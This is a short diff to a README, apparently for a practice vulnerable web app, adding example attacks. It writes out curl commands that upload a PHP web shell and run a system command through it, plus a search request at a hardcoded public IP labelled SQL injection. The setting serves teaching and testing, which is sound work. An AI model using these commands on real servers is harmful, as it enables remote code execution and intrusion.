@@ -26,6 +26,21 @@
 
 ## SQL injections example
 
+#### 1. Shell Injection
+
+```shell
+$ curl -F "image=@path/shell.php" http://IP_address/upload.php
+$ curl -X GET  http://IP_address/images/shell.php\?cmd\=uname
+```
+
+#### 2. SQL Injection 
+
+```shell
+$ curl -X GET  http://52.37.128.197/search.php\?query\=a 
+```
+
+
+
 ## Extensibility
 
 1. Create your own database using your sql file
